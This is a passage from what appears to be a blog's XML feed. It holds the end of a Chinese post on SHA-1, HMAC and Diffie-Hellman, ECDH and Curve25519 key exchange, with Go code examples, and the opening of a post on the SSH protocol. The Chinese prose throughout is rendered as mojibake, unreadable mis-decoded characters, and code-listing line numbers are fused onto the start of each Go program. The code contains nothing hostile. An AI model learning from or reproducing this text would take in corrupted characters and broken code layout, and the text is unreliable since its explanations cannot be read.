ÂØπÂØÜÁ†ÅÂàÜÊûêÁöÑÂÆâÂÖ®ÊÄßÔºöÁî±‰∫éMD5ÁöÑËÆæËÆ°ÔºåÊòìÂèóÂØÜÁ†ÅÂàÜÊûêÁöÑÊîªÂáªÔºåSHA-1ÊòæÂæó‰∏çÊòìÂèóËøôÊ†∑ÁöÑÊîªÂáª„ÄÇ ÈÄüÂ∫¶ÔºöÂú®Áõ∏ÂêåÁöÑÁ°¨‰ª∂‰∏äÔºåSHA-1ÁöÑËøêË°åÈÄüÂ∫¶ÊØîMD5ÊÖ¢„ÄÇ ‰ª£Á†ÅÁ§∫‰æãÁî±‰∫éMD5Â∑≤ÁªèË¢´Á†¥Ëß£‰∫Ü(‰∏≠ÂõΩÂ±±‰∏úÂ§ßÂ≠¶ÁöÑÁéãÂ∞è‰∫ëÊïôÊéàÁ†¥Ëß£), Â∏∏Áî®ÁöÑÊï£ÂàóÁÆóÊ≥ïÊòØshaÂÆ∂Êóè, Êõ¥Âä†ÂÆâÂÖ®ÁöÑÁÆóÊ≥ïÊòØ‰ΩøÁî®Hmac123456789101112131415161718192021222324252627282930313233343536package mainimport ( "crypto/hmac" "crypto/sha1" "fmt" "io")// sha1Êï£ÂàóÁÆóÊ≥ïfunc sha1Hash(msg string) (hashData []byte) &#123; h := sha1.New() io.WriteString(h, msg) hashData = h.Sum(nil) return&#125;// ‰ΩøÁî®sha1ÁöÑHmacÊï£ÂàóÁÆóÊ≥ïfunc hmacHash(msg string, key string) (hashData []byte) &#123; k := []byte(key) mac := hmac.New(sha1.New, k) io.WriteString(mac, msg) hashData = mac.Sum(nil) return&#125;func main() &#123; msg := "This is the message to hash!" // sha1 sha1Data := sha1Hash(msg) fmt.Printf("SHA1: %x\n", sha1Data) // hmac hmacData := hmacHash(msg, "The key string!") fmt.Printf("HMAC: %x\n", hmacData)&#125; ÁßòÈí•‰∫§Êç¢ÁÆóÊ≥ï‰∏ÄÁßçÂØÜÈí•‰∫§Êç¢ÂçèËÆÆÔºåÊ≥®ÊÑèËØ•ÁÆóÊ≥ïÂè™ËÉΩÁî®‰∫éÂØÜÈí•ÁöÑ‰∫§Êç¢ÔºåËÄå‰∏çËÉΩËøõË°åÊ∂àÊÅØÁöÑÂä†ÂØÜÂíåËß£ÂØÜ„ÄÇÂèåÊñπÁ°ÆÂÆöË¶ÅÁî®ÁöÑÂØÜÈí•ÂêéÔºåË¶Å‰ΩøÁî®ÂÖ∂‰ªñÂØπÁß∞ÂØÜÈí•Êìç‰ΩúÂä†ÂØÜÁÆóÊ≥ïÂÆûÈôÖÂä†ÂØÜÂíåËß£ÂØÜÊ∂àÊÅØ„ÄÇÂÆÉÂèØ‰ª•ËÆ©ÂèåÊñπÂú®‰∏çÊ≥ÑÊºèÂØÜÈí•ÁöÑÊÉÖÂÜµ‰∏ãÂçèÂïÜÂá∫‰∏Ä‰∏™ÂØÜÈí•Êù•, Â∏∏Áî®‰∫é‰øùËØÅÂØπÁß∞Âä†ÂØÜÁöÑÁßòÈí•ÁöÑÂÆâÂÖ®, TLSÂ∞±ÊòØËøôÊ†∑ÂÅöÁöÑ„ÄÇÂú®Ëøô‰∏™È¢ÜÂüüÂ∫îËØ•2Áßç DHÔºöECDHÊòØDHÁöÑÂä†Âº∫Áâà ECDH: DHÁÆóÊ≥ïÁöÑÂä†Âº∫Áâà, Â∏∏Áî®ÁöÑÊòØNISTÁ≥ªÂàó,‰ΩÜÊòØÂêéÈù¢curve25519 curve25519: ÂÆûË¥®‰∏ä‰πüÊòØ‰∏ÄÁßçECDH,‰ΩÜÊòØÂÖ∂ÂÆûÁé∞Êõ¥‰∏∫‰ºòÁßÄ,Ë°®Áé∞ÁöÑÊõ¥‰∏∫ÂÆâÂÖ®,ÂèØËÉΩÊòØ‰∏ã‰∏Ä‰ª£ÁßòÈí•‰∫§Êç¢ÁÆóÊ≥ïÁöÑÊ†áÂáÜ„ÄÇ DHDHÂÖ®Áß∞ÊòØ:Diffie-Hellman, ÊòØ‰∏ÄÁßçÁ°Æ‰øùÂÖ±‰∫´KEYÂÆâÂÖ®Á©øË∂ä‰∏çÂÆâÂÖ®ÁΩëÁªúÁöÑÊñπÊ≥ïÔºåÂÆÉÊòØOAKLEYÁöÑ‰∏Ä‰∏™ÁªÑÊàêÈÉ®ÂàÜ„ÄÇWhitefield‰∏éMartin HellmanÂú®1976Âπ¥ÊèêÂá∫‰∫Ü‰∏Ä‰∏™Â•áÂ¶ôÁöÑÂØÜÈí•‰∫§Êç¢ÂçèËÆÆÔºåÁß∞‰∏∫Diffie-HellmanÂØÜÈí•‰∫§Êç¢ÂçèËÆÆ/ÁÆóÊ≥ï(Diffie-Hellman Key Exchange/Agreement Algorithm).Ëøô‰∏™Êú∫Âà∂ÁöÑÂ∑ßÂ¶ôÂú®‰∫éÈúÄË¶ÅÂÆâÂÖ®ÈÄö‰ø°ÁöÑÂèåÊñπÂèØ‰ª•Áî®Ëøô‰∏™ÊñπÊ≥ïÁ°ÆÂÆöÂØπÁß∞ÂØÜÈí•„ÄÇÁÑ∂ÂêéÂèØ‰ª•Áî®Ëøô‰∏™ÂØÜÈí•ËøõË°åÂä†ÂØÜÂíåËß£ÂØÜ„ÄÇDH‰æùËµñ‰∫éËÆ°ÁÆóÁ¶ªÊï£ÂØπÊï∞ÁöÑÈöæÂ∫¶, Â§ßÊ¶ÇËøáÁ®ãÂ¶Ç‰∏ã: ÂèØ‰ª•Â¶Ç‰∏ãÂÆö‰πâÁ¶ªÊï£ÂØπÊï∞ÔºöÈ¶ñÂÖàÂÆö‰πâ‰∏Ä‰∏™Á¥†Êï∞pÁöÑÂéüÊ†πÔºå‰∏∫ÂÖ∂ÂêÑÊ¨°ÂπÇ‰∫ßÁîü‰ªé1 Âà∞p-1ÁöÑÊâÄÊúâÊï¥Êï∞Ê†πÔºå‰πüÂ∞±ÊòØËØ¥ÔºåÂ¶ÇÊûúaÊòØÁ¥†Êï∞pÁöÑ‰∏Ä‰∏™ÂéüÊ†πÔºåÈÇ£‰πàÊï∞ÂÄº a mod p,a2 mod p,‚Ä¶,ap-1 mod p ÊòØÂêÑ‰∏çÁõ∏ÂêåÁöÑÊï¥Êï∞ÔºåÂπ∂‰∏î‰ª•ÊüêÁßçÊéíÂàóÊñπÂºèÁªÑÊàê‰∫Ü‰ªé1Âà∞p-1ÁöÑÊâÄÊúâÊï¥Êï∞. ÂØπ‰∫é‰∏Ä‰∏™Êï¥Êï∞bÂíåÁ¥†Êï∞pÁöÑ‰∏Ä‰∏™ÂéüÊ†πaÔºåÂèØ‰ª•ÊâæÂà∞ÊÉü‰∏ÄÁöÑÊåáÊï∞iÔºå‰ΩøÂæó b = a^i mod p ÂÖ∂‰∏≠0 ‚â§ i ‚â§ Ôºàp-1Ôºâ ÊåáÊï∞iÁß∞‰∏∫bÁöÑ‰ª•a‰∏∫Âü∫Êï∞ÁöÑÊ®°pÁöÑÁ¶ªÊï£ÂØπÊï∞ÊàñËÄÖÊåáÊï∞.ËØ•ÂÄºË¢´ËÆ∞‰∏∫inda,p(b). ECDHÂÖ®Áß∞ÊòØElliptic Curve Diffie-Hellman, ÊòØDHÁÆóÊ≥ïÁöÑÂä†Âº∫Áâà, Âü∫‰∫éÊ§≠ÂúÜÊõ≤Á∫øÈöæÈ¢òÂä†ÂØÜ, Áé∞Âú®ÊòØ‰∏ªÊµÅÁöÑÂØÜÈí•‰∫§Êç¢ÁÆóÊ≥ï„ÄÇECCÊòØÂª∫Á´ãÂú®Âü∫‰∫éÊ§≠ÂúÜÊõ≤Á∫øÁöÑÁ¶ªÊï£ÂØπÊï∞ÁöÑÈöæÂ∫¶, Â§ßÊ¶ÇËøáÁ®ãÂ¶Ç‰∏ã: ÁªôÂÆöÊ§≠ÂúÜÊõ≤Á∫ø‰∏äÁöÑ‰∏Ä‰∏™ÁÇπPÔºå‰∏Ä‰∏™Êï¥Êï∞kÔºåÊ±ÇËß£Q=kPÂæàÂÆπÊòìÔºõÁªôÂÆö‰∏Ä‰∏™ÁÇπP„ÄÅQÔºåÁü•ÈÅìQ=kPÔºåÊ±ÇÊï¥Êï∞kÁ°ÆÊòØ‰∏Ä‰∏™ÈöæÈ¢ò„ÄÇECDHÂç≥Âª∫Á´ãÂú®Ê≠§Êï∞Â≠¶ÈöæÈ¢ò‰πã‰∏ä Ê§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ïÂõ†ÂèÇÊï∞‰∏çÂêåÊúâÂ§öÁßçÁ±ªÂûã, Ëøô‰∏™ÁΩëÁ´ôÂàóÂá∫‰∫ÜÁé∞Èò∂ÊÆµÈÇ£‰∫õECCÊòØÁõ∏ÂØπÂÆâÂÖ®ÁöÑ:Ê§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ïÂÆâÂÖ®ÂàóË°®, ËÄåcurve25519‰æøÊòØÂÖ∂‰∏≠ÁöÑ‰Ωº‰ΩºËÄÖ„ÄÇCurve25519/Ed25519/X25519ÊòØËëóÂêçÂØÜÁ†ÅÂ≠¶ÂÆ∂Daniel J. BernsteinÂú®2006Âπ¥Áã¨Á´ãËÆæËÆ°ÁöÑÊ§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜ/Á≠æÂêç/ÂØÜÈí•‰∫§Êç¢ÁÆóÊ≥ï, ÂíåÁé∞ÊúâÁöÑ‰ªª‰ΩïÊ§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ïÈÉΩÂÆåÂÖ®Áã¨Á´ã„ÄÇÁâπÁÇπÊòØÔºö ÂÆåÂÖ®ÂºÄÊîæËÆæËÆ°: ÁÆóÊ≥ïÂêÑÂèÇÊï∞ÁöÑÈÄâÊã©Áõ¥Êà™‰∫ÜÂΩìÔºåÈùûÂ∏∏ÊòéÁ°ÆÔºåÊ≤°Êúâ‰ªª‰ΩïÂèØÁñë‰πãÂ§ÑÔºåÁõ∏ÊØî‰πã‰∏ãÁõÆÂâçÂπøÊ≥õ‰ΩøÁî®ÁöÑÊ§≠ÂúÜÊõ≤Á∫øÊòØNISTÁ≥ªÂàóÊ†áÂáÜÔºåÊñπÁ®ãÁöÑÁ≥ªÊï∞ÊòØ‰ΩøÁî®Êù•ÂéÜ‰∏çÊòéÁöÑÈöèÊú∫ÁßçÂ≠ê c49d3608 86e70493 6a6678e1 139d26b7 819f7e90 ÁîüÊàêÁöÑÔºåÈùûÂ∏∏ÂèØÁñëÔºåÁñë‰ººÂêéÈó®Ôºõ È´òÂÆâÂÖ®ÊÄßÔºö ‰∏Ä‰∏™Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÂ∞±ÁÆóÂú®Êï∞Â≠¶‰∏äÊòØÂÆâÂÖ®ÁöÑÔºåÂú®ÂÆûÁî®‰∏ä‰πüÂπ∂‰∏ç‰∏ÄÂÆöÂÆâÂÖ®ÔºåÊúâÂæàÂ§ßÁöÑÊ¶ÇÁéáÈÄöËøáÁºìÂ≠ò„ÄÅÊó∂Èó¥„ÄÅÊÅ∂ÊÑèËæìÂÖ•ÊëßÊØÅÂÆâÂÖ®ÊÄßÔºåËÄå25519Á≥ªÂàóÊ§≠ÂúÜÊõ≤Á∫øÁªèËøáÁâπÂà´ËÆæËÆ°ÔºåÂ∞ΩÂèØËÉΩÁöÑÂ∞ÜÂá∫ÈîôÁöÑÊ¶ÇÁéáÈôçÂà∞‰∫ÜÊúÄ‰ΩéÔºåÂèØ‰ª•ËØ¥ÊòØÂÆûË∑µ‰∏äÊúÄÂÆâÂÖ®ÁöÑÂä†ÂØÜÁÆóÊ≥ï„ÄÇ‰æãÂ¶ÇÔºå‰ªª‰Ωï‰∏Ä‰∏™32‰ΩçÈöèÊú∫Êï∞ÈÉΩÊòØ‰∏Ä‰∏™ÂêàÊ≥ïÁöÑX25519ÂÖ¨Èí•ÔºåÂõ†Ê≠§ÈÄöËøáÊÅ∂ÊÑèÊï∞ÂÄºÊîªÂáªÊòØ‰∏çÂèØËÉΩÁöÑÔºåÁÆóÊ≥ïÂú®ËÆæËÆ°ÁöÑÊó∂ÂÄôÂàªÊÑèÈÅøÂÖçÁöÑÊüê‰∫õÂàÜÊîØÊìç‰ΩúÔºåËøôÊ†∑Âú®ÁºñÁ®ãÁöÑÊó∂ÂÄôÂèØ‰ª•‰∏ç‰ΩøÁî®if ÔºåÂáèÂ∞ë‰∫Ü‰∏çÂêåifÂàÜÊîØ‰ª£Á†ÅÊâßË°åÊó∂Èó¥‰∏çÂêåÁöÑÊó∂Â∫èÊîªÂáªÊ¶ÇÁéáÔºåÁõ∏ÂèçÔºå NISTÁ≥ªÂàóÊ§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ïÂú®ÂÆûÈôÖÂ∫îÁî®‰∏≠Âá∫ÈîôÁöÑÂèØËÉΩÊÄßÈùûÂ∏∏Â§ßÔºåËÄå‰∏îÂØπ‰∫éÊüê‰∫õÁêÜËÆ∫ÊîªÂáªÁöÑÂÖçÁñ´ËÉΩÂäõ‰∏çÈ´òÔºå Bernstein ÂØπÂ∏ÇÈù¢‰∏äÊâÄÊúâÁöÑÂä†ÂØÜÁÆóÊ≥ï‰ΩøÁî®12‰∏™Ê†áÂáÜËøõË°å‰∫ÜËÄÉÂØüÔºå 25519ÊòØÂá†‰πéÂîØ‰∏ÄÊª°Ë∂≥Ëøô‰∫õÊ†áÂáÜÁöÑ http://t.cn/RMGmi1g Ôºõ ÈÄüÂ∫¶Âø´: 25519Á≥ªÂàóÊõ≤Á∫øÊòØÁõÆÂâçÊúÄÂø´ÁöÑÊ§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÔºåÊÄßËÉΩËøúËøúË∂ÖËøáNISTÁ≥ªÂàóÔºåËÄå‰∏îÂÖ∑ÊúâÊØîP-256Êõ¥È´òÁöÑÂÆâÂÖ®ÊÄßÔºõ ‰ΩúËÄÖÂäüÂ∫ïÊ∑±Âéö: Daniel J. BernsteinÊòØ‰∏ñÁïåËëóÂêçÁöÑÂØÜÁ†ÅÂ≠¶ÂÆ∂Ôºå‰ªñÂú®Â§ßÂ≠¶ÊõæÁªèÂºÄËÆæËøá‰∏ÄÈó® UNIX Á≥ªÁªüÂÆâÂÖ®ÁöÑËØæÁ®ãÁªôÂ≠¶ÁîüÔºåÁªìÊûú‰∏ÄÂ≠¶Êúü‰∏ãÊù•ÔºåÂèëÁé∞‰∫Ü UNIX Á®ãÂ∫è‰∏≠ÁöÑ 91 ‰∏™ÂÆâÂÖ®ÊºèÊ¥ûÔºõ‰ªñÊó©Âπ¥Âú®ÁæéÂõΩ‰æùÁÑ∂Á¶ÅÊ≠¢Âá∫Âè£Âä†ÂØÜÁÆóÊ≥ïÊó∂ÔºåÊõæÂõ†‰∏∫ÊääËá™Â∑±ËÆæËÆ°ÁöÑÂä†ÂØÜÁÆóÊ≥ïÂèëÂ∏ÉÂà∞ÁΩë‰∏äÈÅ≠Âà∞‰∫ÜÁæéÂõΩÊîøÂ∫úÁöÑËµ∑ËØâÔºå‰ªñÊú¨‰∫∫Êäó‰∫âÂÖ≠Âπ¥ÔºåÊúÄÂêéÁæéÂõΩÊîøÂ∫úÊí§ÈîÄÊâÄÊúâÊåáÊéßÔºåÁõÆÂâçÂè¶‰∏Ä‰∏™ÈùûÂ∏∏ÁÅ´ÁöÑÈ´òÊÄßËÉΩÂÆâÂÖ®ÊµÅÂØÜÁ†Å ChaCha20 ‰πüÊòØÂá∫Ëá™ Bernstein ‰πãÊâãÔºõ ‰∏ã‰∏Ä‰ª£ÁöÑÊ†áÂáÜ: 25519Á≥ªÂàóÊõ≤Á∫øËá™2006Âπ¥ÂèëË°®‰ª•Êù•ÔºåÈô§‰∫ÜÂ≠¶ÊúØÁïåÊó†‰∫∫ÈóÆÊ¥•Ôºå 2013 Âπ¥Áà±Âæ∑Âçé¬∑ÊñØËØ∫ÁôªÊõùÂÖâÊ£±ÈïúËÆ°ÂàíÂêéÔºåËØ•ÁÆóÊ≥ïÁ™ÅÁÑ∂Â§ßÁÅ´ÔºåÂ§ßÈáèËΩØ‰ª∂ÔºåÂ¶ÇOpenSSHÈÉΩËøÖÈÄüÂ¢ûÂä†‰∫ÜÂØπ25519Á≥ªÂàóÁöÑÊîØÊåÅÔºåÂ¶Ç‰ªä25519Â∑≤ÁªèÊòØÂ§ßÂäøÊâÄË∂ãÔºåÂèØÁñëÁöÑNISTÊõ≤Á∫øËøüÊó©Ë¶ÅÈÄÄÂá∫Ê§≠ÂúÜÊõ≤Á∫øÁöÑÂéÜÂè≤ËàûÂè∞ÔºåÁõÆÂâçÔºå RFCÂ¢ûÂä†‰∫ÜSSL/TLSÂØπX25519ÂØÜÈí•‰∫§Êç¢ÂçèËÆÆÁöÑÊîØÊåÅÔºåËÄåÊñ∞Áâà OpenSSL 1.1‰πüÂä†ÂÖ•ÊîØÊåÅÔºåÊòØÊëÜËÑ±ËÄÅÂ§ßÂì•ÁöÑÁ¨¨‰∏ÄÊ≠•Ôºå‰∏ã‰∏ÄÊ≠•ÊòØÂ∞Ü Ed25519ÂÅö‰∏∫ÂèØÈÄâÁöÑTLSËØÅ‰π¶Á≠æÂêçÁÆóÊ≥ïÔºåÂΩªÂ∫ïÊëÜËÑ±NIST ‰ª£Á†ÅÁ§∫‰æãËøôÈáåÈúÄË¶ÅÊåáÂá∫‰∏ãgolangÁöÑÊ†áÂáÜÂ∫ìÁöÑcryptoÈáåÁöÑÊ§≠ÂúÜÊõ≤Á∫øÂÆûÁé∞‰∫ÜËøô4Áßç(ellipticÊñáÊ°£): P224/P256/P384/P521, ËÄåcurve25519ÊòØÂçïÁã¨ÂÆûÁé∞ÁöÑ, ‰ªñ‰∏çÂú®Ê†áÂáÜÂ∫ì‰∏≠: golang.org/x/crypto/curve25519123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212package mainimport ( "crypto" "crypto/elliptic" "crypto/rand" "fmt" "io" "math/big" "golang.org/x/crypto/curve25519")// ECDH ÁßòÈí•‰∫§Êç¢ÁÆóÊ≥ïÁöÑ‰∏ªÊé•Âè£type ECDH interface &#123; GenerateKey(io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) Marshal(crypto.PublicKey) []byte Unmarshal([]byte) (crypto.PublicKey, bool) GenerateSharedSecret(crypto.PrivateKey, crypto.PublicKey) ([]byte, error)&#125;type ellipticECDH struct &#123; ECDH curve elliptic.Curve&#125;type ellipticPublicKey struct &#123; elliptic.Curve X, Y *big.Int&#125;type ellipticPrivateKey struct &#123; D []byte&#125;// NewEllipticECDH ÊåáÂÆö‰∏ÄÁßçÊ§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ïÁî®‰∫éÂàõÂª∫‰∏Ä‰∏™ECDHÁöÑÂÆû‰æã// ÂÖ≥‰∫éÊ§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ïÊ†áÂáÜÂ∫ìÈáåÈù¢ÂÆûÁé∞‰∫Ü4Áßç: ËßÅcrypto/ellipticfunc NewEllipticECDH(curve elliptic.Curve) ECDH &#123; return &amp;ellipticECDH&#123; curve: curve, &#125;&#125;// GenerateKey Âü∫‰∫éÊ†áÂáÜÂ∫ìÁöÑNISTÊ§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ïÁîüÊàêÁßòÈí•ÂØπfunc (e *ellipticECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var d []byte var x, y *big.Int var priv *ellipticPrivateKey var pub *ellipticPublicKey var err error d, x, y, err = elliptic.GenerateKey(e.curve, rand) if err != nil &#123; return nil, nil, err &#125; priv = &amp;ellipticPrivateKey&#123; D: d, &#125; pub = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return priv, pub, nil&#125;// MarshalÁî®‰∫éÂÖ¨Èí•ÁöÑÂ∫èÂàóÂåñfunc (e *ellipticECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*ellipticPublicKey) return elliptic.Marshal(e.curve, pub.X, pub.Y)&#125;// UnmarshalÁî®‰∫éÂÖ¨Èí•ÁöÑÂèçÂ∫èÂàóÂåñfunc (e *ellipticECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var key *ellipticPublicKey var x, y *big.Int x, y = elliptic.Unmarshal(e.curve, data) if x == nil || y == nil &#123; return key, false &#125; key = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return key, true&#125;// GenerateSharedSecret ÈÄöËøáËá™Â∑±ÁöÑÁßÅÈí•ÂíåÂØπÊñπÁöÑÂÖ¨Èí•ÂçèÂïÜ‰∏Ä‰∏™ÂÖ±‰∫´ÂØÜÁ†Åfunc (e *ellipticECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; priv := privKey.(*ellipticPrivateKey) pub := pubKey.(*ellipticPublicKey) x, _ := e.curve.ScalarMult(pub.X, pub.Y, priv.D) return x.Bytes(), nil&#125;// NewCurve25519ECDH ‰ΩøÁî®ÂØÜÁ†ÅÂ≠¶ÂÆ∂Daniel J. BernsteinÁöÑÊ§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ï:Curve25519Êù•ÂàõÂª∫ECDHÂÆû‰æã// Âõ†‰∏∫Curve25519Áã¨Á´ã‰∫éNIST‰πãÂ§ñ, Ê≤°Âú®Ê†áÂáÜÂ∫ìÂÆûÁé∞, ÈúÄË¶ÅÂçïÁã¨‰∏∫ÊúüÂÆûÁé∞‰∏ÄÂ•óÊé•Âè£Êù•ÊîØÊåÅECDHfunc NewCurve25519ECDH() ECDH &#123; return &amp;curve25519ECDH&#123;&#125;&#125;type curve25519ECDH struct &#123; ECDH&#125;// GenerateKey Âü∫‰∫écurve25519Ê§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ïÁîüÊàêÁßòÈí•ÂØπfunc (e *curve25519ECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var pub, priv [32]byte var err error _, err = io.ReadFull(rand, priv[:]) if err != nil &#123; return nil, nil, err &#125; priv[0] &amp;= 248 priv[31] &amp;= 127 priv[31] |= 64 curve25519.ScalarBaseMult(&amp;pub, &amp;priv) return &amp;priv, &amp;pub, nil&#125;// ÂÆûÁé∞ÂÖ¨Èí•ÁöÑÂ∫èÂàóÂåñfunc (e *curve25519ECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*[32]byte) return pub[:]&#125;// ÂÆûÁé∞ÂÖ¨Èí•ÁöÑÂèçÂ∫èÂàóÂåñfunc (e *curve25519ECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var pub [32]byte if len(data) != 32 &#123; return nil, false &#125; copy(pub[:], data) return &amp;pub, true&#125;// ÂÆûÁé∞ÁßòÈí•ÂçèÂïÜÊé•Âè£func (e *curve25519ECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; var priv, pub, secret *[32]byte priv = privKey.(*[32]byte) pub = pubKey.(*[32]byte) secret = new([32]byte) curve25519.ScalarMult(secret, priv, pub) return secret[:], nil&#125;func test(e ECDH) &#123; var privKey1, privKey2 crypto.PrivateKey var pubKey1, pubKey2 crypto.PublicKey var pubKey1Buf, pubKey2Buf []byte var err error var ok bool var secret1, secret2 []byte // ÂáÜÂ§á2ÂØπÁßòÈí•ÂØπ,A: privKey1,pubKey1 B:privKey2,pubKey2 privKey1, pubKey1, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; privKey2, pubKey2, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; pubKey1Buf = e.Marshal(pubKey1) pubKey2Buf = e.Marshal(pubKey2) pubKey1, ok = e.Unmarshal(pubKey1Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; pubKey2, ok = e.Unmarshal(pubKey2Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; // A ÈÄöËøáBÁªôÁöÑÂÖ¨Èí•ÂçèÂïÜÂÖ±‰∫´ÂØÜÁ†Å secret1, err = e.GenerateSharedSecret(privKey1, pubKey2) if err != nil &#123; fmt.Println(err) &#125; // B ÈÄöËøáAÁªôÁöÑÂÖ¨Èí•ÂçèÂïÜÂÖ±‰∫´ÂØÜÁ†Å secret2, err = e.GenerateSharedSecret(privKey2, pubKey1) if err != nil &#123; fmt.Println(err) &#125; // A BÂú®Ê≤°Êö¥Èú≤Áõ¥Êé•ÁöÑÁßÅÈí•ÁöÑÊÉÖÂÜµ‰∏ã, ÂçèÂïÜÂá∫‰∫Ü‰∏Ä‰∏™ÂÖ±‰∫´ÂØÜÁ†Å fmt.Printf("The secret1 shared keys: %x\n", secret1) fmt.Printf("The secret2 shared keys: %x\n", secret2)&#125;func main() &#123; e1 := NewEllipticECDH(elliptic.P521()) e2 := NewCurve25519ECDH() test(e1) test(e2)&#125; ÊÄª‰ΩìÁªìËÆ∫‰ª•‰∏äÁªºËø∞‰∫Ü‰∏§ÁßçÂä†ÂØÜÊñπÊ≥ïÁöÑÂéüÁêÜÔºåÊÄª‰ΩìÊù•ËØ¥‰∏ªË¶ÅÊúâ‰∏ãÈù¢Âá†‰∏™ÊñπÈù¢ÁöÑ‰∏çÂêåÔºö ÁÆ°ÁêÜÊñπÈù¢ÔºöÂÖ¨Èí•ÂØÜÁ†ÅÁÆóÊ≥ïÂè™ÈúÄË¶ÅËæÉÂ∞ëÁöÑËµÑÊ∫êÂ∞±ÂèØ‰ª•ÂÆûÁé∞ÁõÆÁöÑÔºåÂú®ÂØÜÈí•ÁöÑÂàÜÈÖç‰∏äÔºå‰∏§ËÄÖ‰πãÈó¥Áõ∏Â∑Æ‰∏Ä‰∏™ÊåáÊï∞Á∫ßÂà´Ôºà‰∏Ä‰∏™ÊòØn‰∏Ä‰∏™ÊòØn2Ôºâ„ÄÇÊâÄ‰ª•ÁßÅÈí•ÂØÜÁ†ÅÁÆóÊ≥ï‰∏çÈÄÇÂ∫îÂπøÂüüÁΩëÁöÑ‰ΩøÁî®ÔºåËÄå‰∏îÊõ¥ÈáçË¶ÅÁöÑ‰∏ÄÁÇπÊòØÂÆÉ‰∏çÊîØÊåÅÊï∞Â≠óÁ≠æÂêç„ÄÇ ÂÆâÂÖ®ÊñπÈù¢ÔºöÁî±‰∫éÂÖ¨Èí•ÂØÜÁ†ÅÁÆóÊ≥ïÂü∫‰∫éÊú™Ëß£ÂÜ≥ÁöÑÊï∞Â≠¶ÈöæÈ¢òÔºåÂú®Á†¥Ëß£‰∏äÂá†‰πé‰∏çÂèØËÉΩ„ÄÇÂØπ‰∫éÁßÅÈí•ÂØÜÁ†ÅÁÆóÊ≥ïÔºåÂà∞‰∫ÜAESËôΩËØ¥‰ªéÁêÜËÆ∫Êù•ËØ¥ÊòØ‰∏çÂèØËÉΩÁ†¥Ëß£ÁöÑÔºå‰ΩÜ‰ªéËÆ°ÁÆóÊú∫ÁöÑÂèëÂ±ïËßíÂ∫¶Êù•Áúã„ÄÇÂÖ¨Èí•Êõ¥ÂÖ∑Êúâ‰ºòË∂äÊÄß„ÄÇ ÈÄüÂ∫¶‰∏äÊù•ÁúãÔºöAESÁöÑËΩØ‰ª∂ÂÆûÁé∞ÈÄüÂ∫¶Â∑≤ÁªèËææÂà∞‰∫ÜÊØèÁßíÊï∞ÂÖÜÊàñÊï∞ÂçÅÂÖÜÊØîÁâπ„ÄÇÊòØÂÖ¨Èí•ÁöÑ100ÂÄçÔºåÂ¶ÇÊûúÁî®Á°¨‰ª∂Êù•ÂÆûÁé∞ÁöÑËØùËøô‰∏™ÊØîÂÄºÂ∞ÜÊâ©Â§ßÂà∞1000ÂÄç„ÄÇ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ë∑≥ÊùøÊú∫Á≥ªÂàó(‰∫å)-sshÂçèËÆÆÂéüÁêÜÁÆÄ‰ªã]]></title>
    <url>%2F2017%2F02%2F16%2Fssh-protocol%2F</url>
    <content type="text"><![CDATA[SSHÂØπ‰∫éÂ§ßÂ§öÊï∞‰∫∫Êù•ËØ¥Â∫îËØ•Âπ∂‰∏çÈôåÁîü, Êó†ËÆ∫‰Ω†ÊòØÂºÄÂèëËøòÊòØÊµãËØïËøòÊòØËøêÁª¥, Âè™Ë¶Å‰Ω†ÈúÄË¶ÅÁôªÂΩïÁ±ªUnixÊúçÂä°Âô®ÈÉΩ‰ºöÁî®Âà∞, ‰ªñË¢´Áî®Êù•Êèê‰æõÈìæÊé•ÁöÑÂÆâÂÖ®‰øùÈöú, ÊØîÂ¶ÇÂ∏∏ËßÅÁöÑÂÆ¢Êà∑Á´ØÊúâÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ssh, ‰ª•ÂèäÂë®ËæπÁöÑÂïÜ‰∏öÂ∑•ÂÖ∑XshellÁ≠â„ÄÇÂú®ËøôÁØáÊñáÁ´†ÈáåÊàë‰ª¨‰∏ç‰ºöÊïô‰Ω†Â¶Ç‰Ωï‰ΩøÁî®xshell, ËÄåÊòØ‰ªéÂçèËÆÆÂ±ÇÈù¢ÂÖ®Êñ∞ÁöÑËÆ§ËØÜ‰∏ãssh„ÄÇ 